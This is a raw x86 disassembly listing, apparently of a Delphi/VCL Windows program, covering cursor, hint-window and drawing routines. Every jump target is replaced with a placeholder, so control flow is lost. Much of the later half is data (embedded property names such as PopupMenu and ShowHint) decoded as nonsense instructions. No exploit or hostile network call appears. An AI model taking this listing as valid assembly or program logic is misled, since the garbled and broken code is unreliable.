lea ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_42c3a8
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
add eax 0x54
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_425dc0
mov al [ ebp - 0x15 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x48 ] al
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
xor ecx ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_425b80
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
xor ecx ecx
mov cl [ ebp - 0x15 ]
mov edx 0xb041
mov eax [ ebp - 0x10 ]
call sub_42df28
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov al [ ebp - 0x15 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x48 ] al
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
lea eax [ ebp - 0x20 ]
push eax
call GetCursorPos
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_425fec
jmp r-xdata
sub_425d34
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_425bd0
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x79 ]
sub al 0x1
jb r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_425fec
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_425d74
jmp r-xdata
sub_425d74
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_434714
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_434714
push eax
call ShowWindow
sub_425dc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_425d74
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x50 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] 0x0
call sub_423754
mov eax [ ebp - 0x4 ]
call sub_425bd0
sub_425e0c
push ebp
mov ebp esp
add esp 0xffffffcc
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x34 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_425f80
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x28 ]
call sub_4112a8
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_4460c4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_425f4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x28 ]
call sub_41138c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f54
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_44ba74
retn
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x20 ]
movzx edx [ edx + 0xe ]
imul edx
add eax 0x1f
and eax 0xffffffe0
test eax eax
jns r-xdata
sar eax 0x3
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
imul [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
push ebp
mov ecx 0xff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
call sub_425df8
pop ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add eax 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x2c ]
sub [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
push ebp
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
xor ecx ecx
mov edx [ ebp - 0x10 ]
call sub_425df8
pop ecx
mov [ ebp - 0x4 ] eax
sub_425f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x28 ]
push eax
call DeleteObject
sub_425f90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_44c070
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_44bfb8
cmp eax [ ebp - 0x4 ]
je r-xdata
pop ecx
pop ebp
retn
sub_425fec
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_44d248
xor eax eax
push ebp
push sub_4263b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_425dc0
xor ecx ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_425b80
jmp r-xdata
call sub_41a2f0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263bb
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_44cb04
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_44d314
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_42ac70
call sub_423598
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x50 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
push ebp
call sub_425e0c
pop ecx
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_4226cc
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_42c198
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
mov ecx 0x4
[ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_42c3e4
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_423550
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_4290f8
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_44cb78
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
xor ecx ecx
mov edx 0xb030
call sub_42df28
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x164 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x48 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_425f90
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov dl [ eax + 0x4f ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov ebx [ eax ]
call [ ebx + 0xc0 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov bx 0xffce
call sub_44c24c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_42c3a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x54 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x58 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_42c3a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x5c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x60 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx [ ebp - 0x4c ]
call sub_42cc88
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov ebx [ eax ]
call [ ebx + 0xbc ]
call sub_4236d8
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov eax [ eax + 0x1f0 ]
mov edx [ ebp - 0x28 ]
call sub_40fa08
add eax 0x5
sub [ ebp - 0x70 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov eax [ eax + 0x1f0 ]
mov edx [ ebp - 0x28 ]
call sub_40fa08
add eax 0x5
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_425b80
jmp r-xdata
xor ecx ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_425b80
jmp r-xdata
sub_4263c4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov eax [ ebp - 0xc ]
push eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42df28
dec eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al 0x1
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_42df28
dec eax
je r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x32 ] 0x0
setne dl
mov eax [ ebp - 0xc ]
call sub_404d1c
sub_426470
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xaa ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x9 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_4264ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb2 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x9 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_4264e8
add [ eax ] eax
add [ eax ] al
push eax
int1
inc esi
add [ edx + ecx * 4 + 0x42 ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426541
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426548
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_41a004
mov eax [ rw-data ]
push eax
call CloseHandle
sub_42656c
mov eax 0x4265
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x66 ] al
inc edx
add [ esi + 0x66 ] cl
inc edx
add [ eax + 0x1 ] al
add [ eax ] al
and al 0x88
inc edx
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
sub_4265a8
in al 0xe1
inc edx
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax - 0x7c ] 0x6b
inc edx
add [ ecx + esi * 8 - 0x1ccfffbe ] dh
inc edx
add [ ecx * 8 - 0xe8bffbd ] cl
inc edx
add ah cl
mov ebx 0xbb200042
inc edx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp + 0x6ac00044 ] bl
inc edx
add al bl
fadd [ edx ]
sbb al 0x71
inc edx
add ah dl
fld [ edx ]
add al 0xc3
inc edx
add [ edx + eax * 8 ] ah
inc edx
add [ eax ] ah
iretd
sub_426635
mov esp 0xd1340042
inc edx
add al cl
insb
inc edx
add [ edx ] al
add ah bl
dec ebp
inc esp
imul eax [ edx ] 0x64
outsb
inc edx
add [ esi ] al
push esp
dec ecx
insd
popad
nop
nop
nop
pop esp
inc dx
add [ edi ] al
push es
push esp
dec ecx
insd
popad
mov eax 0x10004265
mov [ edx ] eax
add [ es : eax ] cl
inc ebp
js r-xdata
loopne r-xdata
inc ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
push es
inc ebx
outsb
je r-xdata
outsb
insb
jae r-xdata
add [ ecx ] dl
add [ edx ] dl
dec ecx
outsb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
dec ebp
add [ eax ] al
[ eax ]
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
imul esp [ edi + 0x6e ] r-xdata
push ecx
add [ eax ] al
push [ ecx + edi * 4 - 0x4573ffbe ]
inc edx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esp + esi * 2 ] ch
inc edx
add [ ebx ] cl
add bh bh
and al 0xbc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add eax 0x67696c41
outsb
mov esp 0x51004278
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or [ eax + 0x6f ] edx
insb
inc esp
imul esi [ ebx + 0x70 ] 0x4c79616c
movsd [ edi ] [ esi ]
inc esp
add [ edx + 0x44ff0000 ] cl
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
push cs
push eax
popad
jb r-xdata
dec ebp
outsd
dec esp
jns r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] cl
inc [ esi + eax * 8 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
jo r-xdata
add [ eax ] al
adc [ 0x68530800 ] 0x6f
ja r-xdata
outsb
je r-xdata
inc ebx
jne r-xdata
add [ eax + eax ] ah
jmp [ eax + eax ]
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] sub_44a54c
cmp [ ecx ] eax
add bh bh
add [ eax ] eax
push [ edi + ebp * 2 + 0x42 ]
outsb
jne r-xdata
outsb
imul ebp [ esi + 0x74 ] sub_44a54c
cmp [ ecx ] al
add bh bh
cmp al 0x6f
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ edi ] al
push ebx
je r-xdata
add bh bh
cld
push 0x6948776f
outsb
je r-xdata
jae r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
str [ eax ]
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
sbb [ edx ] 0x0
outsb
jae r-xdata
je r-xdata

movsd [ edi ] [ esi ]
inc esp
add [ ecx - 0x3010000 ] cl
outsb
inc ebx
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
push cs
dec edi
movsd [ edi ] [ esi ]
inc esp
add [ edi ] al
add bh bh
cmp al cl
inc edx
add [ ecx + esi * 8 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf4656c62
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ eax - 0xf ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070019 ] al
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
je r-xdata
jo r-xdata
arpl [ ebp + esi * 2 + 0x72 ] si
clc
bound eax [ eax ]
insb
add [ eax ] al
inc [ eax + 0x10042c9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090014 ] al
outsd
xlat
inc eax
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsd
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070013 ] al
imul esp [ ebx + 0x74 ] 0xf8657275
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add bh bh
cmp al [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
adc cl [ ecx + 0x6e ]
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] cl
dec esp
push cs
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f0a001d ] al
outsb
inc esp
jb r-xdata
js r-xdata
jne r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001a ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
push esp
jb r-xdata
inc edx
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pop es
dec edi
push sub_44a54c
cmp eax [ ecx ]
add bh bh
add [ eax ] al
dec edi
jbe r-xdata
inc esp
push eax
outsd
jo r-xdata
jl r-xdata
hlt
outsb
je r-xdata
je r-xdata
outsb
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001e ] al
outsb
inc ebp
outsb
inc esp
jo r-xdata
inc edx
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jge r-xdata
mov [ edx + 0x42 ] bh
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0021 ] al
outsb
dec ebp
outsd
add [ eax + 0x4f090022 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0b0020 ] al
and al 0x7a
inc edx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001b ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
nop
nop
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
push ebp
jo r-xdata
popad
jb r-xdata
add al ch
imul eax [ esp + edi * 2 ] 0x42
dec ebp
outsd
jbe r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09001f ] al
outsb
inc ebp
outsb
inc esp
inc esp
jb r-xdata
mov [ ebp - 0xc ] ecx
add esp 0xfffffff0
call sub_44c370
and al 0x0
or ecx [ edi + 0x6e ]
aad 0x40
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
push eax
jb r-xdata
mov [ eax + 0x1c ] edx
push eax
mov eax edx
mov dx 0xffcd
call sub_44c264
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx 0x69
mov eax [ ebp - 0x4 ]
call sub_42bfa8
mov edx 0x69
mov eax [ ebp - 0x4 ]
call sub_42bf6c
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
push ebp
cld
inc esp
jb r-xdata
push ebx
je r-xdata
outsb
and al 0x7a
jpe r-xdata
jo r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412048
mov edx [ ebp - 0x4 ]
jb r-xdata
dec ebp
jb r-xdata
mov eax [ eax + 0x128 ]
mov edx [ ebp - 0x4 ]
inc eax
or [ edi + ebp * 2 + 0x458b0042 ] ch
cld
jne r-xdata
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jl r-xdata
inc esp
jpo r-xdata
mov [ edx + 0x128 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_426fac
mov eax [ ebp - 0x4 ]
inc esp
outsd
arpl [ ebx + 0x4 ] bp
jl r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_435bb4
jae r-xdata
outsd
arpl [ ebx + 0x44 ] bp
inc esp
add al bl
add [ eax ] al
hlt
add al bh
add [ eax ] al
mov eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
